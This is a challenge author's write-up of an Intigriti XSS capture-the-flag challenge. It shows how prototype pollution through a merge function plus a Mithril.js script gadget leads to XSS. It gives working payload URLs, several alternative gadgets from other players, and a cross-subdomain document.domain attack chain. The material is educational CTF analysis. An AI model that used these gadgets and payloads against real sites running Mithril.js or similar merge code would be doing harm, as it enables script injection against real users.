---
title: Revenge of Intigriti 0422 Challenge Author Writeup
date: 2022-05-02 08:20:16
tags: [Security]
categories: [Security]
translator: huli
photos: /img/intigriti-revenge-challenge-author-writeup/cover-en.png
---

<img src="/img/intigriti-revenge-challenge-author-writeup/cover-en.png" style="display:none">

Among the many web vulnerabilities, my favorite is prototype pollution. It can be powerful sometimes when you find a script gadget. 

So, I decided to make an XSS challenge about prototype pollution.

In April, the challenge I made was released on Intigriti, if you haven't checked that one, here is the link: https://challenge-0422.intigriti.io/

Making a good challenge is hard.

I made a few mistakes. With the bugs I made, the challenge became much easier. To make up for it, I decided to make another one, called "The Revenge of Intigriti 0422 Challenge".

Below is the intended solution to the revenge challenge.

Challenge URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422

<!-- more -->

## Solution

TL;DR

1. Pollute Array.prototype via `merge` function
2. Bypass `checkHost()` and pollute Object.prototype via `merge` function 
3. Find a script gadget in Mithril.js
4. XSS

### Step1. Prototype pollution on Array.prototype
### Step2. Bypass checkHost

These two steps are the same as the previous one, you can find the detail in my previous writeup: [Intigriti 0422 XSS Challenge Author Writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)

### Step3. Prototype pollution again

Starting from step3, it's totally different from the previous one.

For previous one, you can override `document.body.innerHTML` to achieve XSS. But it does not work anymore because of the patch:

```
- if (typeof data !== 'string') return data
+ if (typeof data !== 'string') data = String(data)
```

What else can we do?

At second merge call, we have `devSettings["root"] = document.createElement('main')`, what can we do from a DOM element?

The idea is, if we can find a property that `property.constructor.prototype` === `Object.prototype` from this DOM element, we can pollute Object.prototype!

How should we find such property? For me, I will try to start with either `document` or `window`, because it's more likely to have it.

First, we can get `window` object via `document.querySelector('main').ownerDocument.defaultView`

`Object` is in the `protectedKeys`, so we can't just pollute `ownerDocument.defaultView.Object.constructor.prototype.xxx`.

It's not a big problem, we can do a little fuzzing to find other properties to use:

``` js
for(let key in window) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}
```

On Chrome, it's `styleMedia`, `webkitStorageInfo` and `chrome`.

On Firefox, it's `external` and `sidebar`.

By using these properties, we can pollute `Object.prototype` on both Chrome and Firefox

``` js
// firefox
settings[root][ownerDocument][defaultView][external][constructor][prototype][autofocus]=1

// chrome
settings[root][ownerDocument][defaultView][chrome][constructor][prototype][autofocus]=1
```

It seesm complex, is there a simpler way? Yes!

In JavaScript, every properties has a flag called `enumerable`, `for in` can only enumerate enumerable properties. If we want to get all the properties in an object, we should use [Object.getOwnPropertyNames](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames) instead.


``` js
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}
```

On Chrome, it's:

1. JSON
2. Math
3. Intl
4. Reflect
5. console
6. CSS
7. styleMedia
8. webkitStorageInfo
9. Atomics
10. chrome
11. WebAssembly

On Firefox, it's:

1. JSON
2. Math
3. Intl
4. Reflect
5. Atomics
6. WebAssembly
7. CSS
8. external
9. sidebar
10. netscape
11. console

If you see different results, it's most likely because of the extension you have installed. For example, `web3` or `ethereum` if you have metamask installed.

Anyway, we can use `JSON` to construct our payload:

``` 
settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]=1
```

### Step4. Find prototype pollution gadget in mithril.js

After we can pollute `Object.prototype`, we need to find a [script gadget](https://github.com/BlackFan/client-side-prototype-pollution) to achieve XSS, and it's exactly the final step of this challenge: find a prototype pollution gadget in mithril.js.

Mithril.js is not a big project, the codebase is relatively small. Although it may take some time, finding a gadget is definitely possible.

There is a type of usage that can be vulnerable to prototype pollution:

``` js
for(let key in obj) {
 // do something
}
```

Why? Let's see the following example:

``` js
var obj = {}
Object.prototype.a = 123
for(let key in obj) {
 console.log(key) // a
}
```

`for in` also iterates the properties of `Object.prototype`.

So, we can start by finding such pattern.

Here is the part for setting the DOM attributes: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L728

``` js
function setAttrs(vnode, attrs, ns) {
  for (var key in attrs) {
    setAttr(vnode, key, null, attrs[key], ns)
  }
}
```

The key here is that `for in` has been used, which means our polluted properties will be there as well.

Now, we know that we can pollute DOM attribute, so our goal is to use an inline event handler like `onfocus` to trigger XSS.


Keep diving in to see what `setAttr` does: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L733

``` js
function setAttr(vnode, key, old, value, ns) {
  if (key === "key" || key === "is" || value == null || isLifecycleMethod(key) || (old === value && !isFormAttribute(vnode, key)) && typeof value !== "object") return
  if (key[0] === "o" && key[1] === "n") return updateEvent(vnode, key, value)
  if (key.slice(0, 6) === "xlink:") vnode.dom.setAttributeNS("http://www.w3.org/1999/xlink", key.slice(6), value)
  else if (key === "style") updateStyle(vnode.dom, old, value)
  else if (hasPropertyKey(vnode, key, ns)) {
    if (key === "value") {
      // Only do the coercion if we're actually going to check the value.
      /* eslint-disable no-implicit-coercion */
      //setting input[value] to same value by typing on focused element moves cursor to end in Chrome
      if ((vnode.tag === "input" || vnode.tag === "textarea") && vnode.dom.value === "" + value && vnode.dom === activeElement()) return
      //setting select[value] to same value while having select open blinks select dropdown in Chrome
      if (vnode.tag === "select" && old !== null && vnode.dom.value === "" + value) return
      //setting option[value] to same value while having select open blinks select dropdown in Chrome
      if (vnode.tag === "option" && old !== null && vnode.dom.value === "" + value) return
      /* eslint-enable no-implicit-coercion */
    }
    // If you assign an input type that is not supported by IE 11 with an assignment expression, an error will occur.
    if (vnode.tag === "input" && key === "type") vnode.dom.setAttribute(key, value)
    else vnode.dom[key] = value
  } else {
    if (typeof value === "boolean") {
      if (value) vnode.dom.setAttribute(key, "")
      else vnode.dom.removeAttribute(key)
    }
    else vnode.dom.setAttribute(key === "className" ? "class" : key, value)
  }
}
```

If a property name starts with `on`, `updateEvent` will be called and it takes a `function` as parameters, no way to inject a string handler. 

We can use `ON` instead of `on` to bypass this.

Another thing we need to get around is this check: `hasPropertyKey(vnode, key, ns)`

If this returns true, it executes `vnode.dom[key] = value` in the end. It's not what we want because `vnode.dom['ONCLICK'] = 'alert(1)'` makes no effect.

The only way to add a inline event handler to the DOM element is to let `hasPropertyKey(vnode, key, ns)` failed and then run `vnode.dom.setAttribute(key === "className" ? "class" : key, value)`, for example:

``` html
<html lang="en">
  <head>
    <meta charset="utf-8">
  </head>
  <body>
    <div id=a>click me</div>
    <script>
      // this works
      a.setAttribute('ONCLICK', 'alert(1)')
    </script>
  </body>
</html>
```

Now, our goal is to fail `hasPropertyKey(vnode, key, ns)` and make it returns `false`:

https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L815

``` js
function hasPropertyKey(vnode, key, ns) {
  // Filter out namespaced keys
  return ns === undefined && (
    // If it's a custom element, just keep it.
    vnode.tag.indexOf("-") > -1 || vnode.attrs != null && vnode.attrs.is ||
    // If it's a normal element, let's try to avoid a few browser bugs.
    key !== "href" && key !== "list" && key !== "form" && key !== "width" && key !== "height"// && key !== "type"
    // Defer the property check until *after* we check everything.
  ) && key in vnode.dom
}
```

It returns `false` if `ns` is not `undefined`. But wait, where is this `ns` comes from?

Here is the code:  https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L15

``` js
function getNameSpace(vnode) {
  return vnode.attrs && vnode.attrs.xmlns || nameSpace[vnode.tag]
}
```

It's from `vnode.attrs.xmlns`, so we can pollute this attribute.

In order to not affect other functionalities, we can use the default namespace for HTML: `http://www.w3.org/1999/xhtml`

To piece all the puzzles together, following is a simple proof-of-concept:

``` js
const App = {
  view: function() {
    return m("input", {class: 'a'},"hello")
  }
}

Object.prototype.xmlns = 'http://www.w3.org/1999/xhtml'
Object.prototype.autofocus = 1
Object.prototype.ONFOCUS = 'alert(1)'
m.mount(document.querySelector('main'), App)
```

To sum up, we need to:

1. Pollute Array.prototype[1] to bypass checkHost() check
3. Pollute a few properties on Object.prototype including `xmlns`, `autofocus` and `ONFOCUS` to perform XSS

As what I said in the beginning, the challenge is all about prototype pollution!

Here is what we need in the end:

```
?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]=1&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]=alert(document.domain)&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]=http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml
```

URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]=1&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]=alert(document.domain)&settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]=http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml

## Other script gadgets

Besides the above gadget, some players also find another one.

``` js
const App = {
  view: function() {
    return m("div", {class: 'a'},"hello")
  }
}

Object.prototype.tag = 'img'
Object.prototype.src = '1'
Object.prototype.img = 'http://www.w3.org/1999/xhtml'
Object.prototype.attrs = ''
Object.prototype.Onerror = 'alert(1)'
m.mount(document.querySelector('main'), App)
```

It creates a new element from nothing by polluting `Object.prototype.tag`. The rest part is similar with the intended gadget.

And also this cool gadget found by [@lbrnli1234](https://twitter.com/lbrnli1234):

``` js
const App = {
  view: function() {
    return m("div", {class: 'a'},"hello")
  }
}

Object.prototype.tag = 'style'
Object.prototype.attrs = ''
String.prototype.Onerror = 'alert(1)'
m.mount(document.querySelector('main'), App)
```

## Unintended(for the previous one, not revenge challenge)

### #1 Unintended but fixed solution

Before the original challenge has released to the public, @PinkDraconian gave early access to the other four players for private testing.

At that time, there is no `sanitize` function, and `root` is added to DOM before Mithril.js.

To my surprise, one player found an unintended solution:

``` js
settings[root][outerHTML]=<input autofocus onfocus=alert(document.domain)>
```

It works because you can assign any value to the DOM in the `merge` function.

I was too focused on prototype pollution to find this unintended, thanks again to the player for finding it before the challenge was released to the public.

Also, this attack surface creates more other ways to the unintended because one can access `document` and `window`, like:

``` js
document.body.innerHTML = '<svg onload=alert(1)>'
document.location.href = 'javascript:alert(1)'
window.location.href = 'javascript:alert(1)'
```

To prevent this, I added a sanitize function to filter dangerous characters, hoping to close the door for injecting arbitrary HTML.

But, as you know, I failed. So I try to fix it again and release this revenge challenge.

### #2 Unintended but not fixed solution

After the patch, I found another interesting unintended solution.

Remember that we can set the value for any attributes on `document`?

We can set `document.domain` to `intigriti.io` and then leverage another challenge from a different subdomain!

If both subdomains set their domain to `intigriti.io`, they can interact with each other as if they are same-origin! See [MDN docs](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain) for more detail.

For example, we can:

1. Use XSS in challenge-0222.intigriti.io, change `document.domain` to `intigriti.io`
2. Add an iframe to embed challenge-0422.intigriti.io, also set document.domain via config query string
3. It's same-origin now, we can perform XSS on `challege-0422` from `challenge-0222`.

Code:

``` js
document.domain='intigriti.io';
a=document.createElement('iframe');
a.src='https://challenge-0422.intigriti.io/challenge/Window Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][domain]=intigriti.io';
document.body.appendChild(a);
a.onload=function(){
  setTimeout(()=>{
    a.contentWindow.document.body.innerHTML='<style onload=alert(document.domain)>';
  // we need to change it back
    a.contentWindow.document.domain='challenge-0422.intigriti.io'
  },1000)
}
```

PoC URL:

```
https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle%20onload=eval(uri)%3E&first=yes#%0adocument.domain=%27intigriti.io%27;a=document.createElement(%27iframe%27);a.src=%27https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][domain]=intigriti.io%27;document.body.appendChild(a);a.onload=function()%7BsetTimeout(() => {a.contentWindow.document.body.innerHTML='<style onload=alert(document.domain)>';a.contentWindow.document.domain='challenge-0422.intigriti.io'},1000)}
```

I talked with @PinkDraconian about this fantastic solution, we decided not to fix it and only accept the first report.

As far as I know, no one has submitted this kind of solution.

In the revenge challenge, I exclude this solution by adding a rule saying that: `Should not leverage other challenges on the same domain.`

By the way, it will be no longer possible from Chrome 106: https://developer.chrome.com/blog/immutable-document-domain/


## Takeaways

1. Prototype pollution is powerful
2. Making a good challenge is hard
3. Now, I know how the author feels when they saw my unintended